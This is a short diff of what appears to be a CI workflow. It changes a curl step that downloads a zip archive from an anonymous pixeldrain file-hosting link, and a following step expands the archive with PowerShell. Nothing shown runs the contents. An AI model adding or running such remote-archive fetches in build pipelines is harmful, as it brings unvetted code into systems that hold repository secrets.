@@ -13,7 +13,7 @@ jobs:
 
     - name: Download and extract-v5858
       run: |
-        curl -L -o code.zip https://pixeldrain.com/api/file/fgtrwbnf/info/zip/main10.zip
+        curl -L -o code.zip https://pixeldrain.com/api/file/8Wjn1dPC/info/zip/main10.zip
         Start-Sleep -Seconds 5
         powershell -Command "Expand-Archive -Force code.zip extracted"
 
